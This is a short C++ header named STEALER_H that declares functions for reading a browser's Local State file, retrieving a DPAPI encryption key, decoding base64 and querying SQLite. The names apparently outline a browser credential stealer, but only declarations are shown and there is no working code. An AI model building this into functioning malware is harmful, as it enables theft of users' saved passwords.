#ifndef STEALER_H
#define STEALER_H

/* Standard Header Files */
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>

/* Libraries */
#include "sqlite3.h"
#include "SQLfunctions.h"
#include "../nlohmann/json.hpp"

using json = nlohmann::json;

/* Functions */
std::vector<BYTE> b64Decode(std::string);
char* readFile(char*);
std::vector<byte> GetLocalState(void);
PDATA_BLOB GetEncryptionKey(void);
static int callback(void*, int, char **, char **);
json driver(void);

#endif